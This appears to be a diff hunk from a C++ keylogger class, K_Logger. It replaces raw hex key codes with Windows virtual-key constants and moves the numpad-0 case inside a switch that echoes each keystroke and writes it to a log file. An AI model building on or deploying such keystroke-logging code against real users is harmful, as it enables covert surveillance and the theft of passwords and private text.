@@ -567,31 +567,32 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile("  *END*  ");
 			break;
 
-		case 0x24:
+		case VK_HOME:
 			std::cout << "  *HOME*  ";
 			WriteToFile("  *HOME*  ");
 			break;
 
-		case 0x90:
+		case VK_NUMLOCK:
 			std::cout << "  *Num_Lock*  ";
 			WriteToFile("  *Num_Lock*  ");
 			break;
 
-		case 0x5C:
+		case VK_RWIN:
 			std::cout << "  *Right_Windows*  ";
 			WriteToFile("  *Right_Windows*  ");
 			break;
 
-		case 0x60:
-			std::cout << "0";
-			WriteToFile("0");
-			break;
 
 
 
 
 		//+-+-+-+-+-+All figures below are NUMPAD-+-+-+-+-+
 		//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+		case 0x60:
+			std::cout << "0";
+			WriteToFile("0");
+			break;
+
 		case 0x61:
 			std::cout << "1";
 			WriteToFile("1");
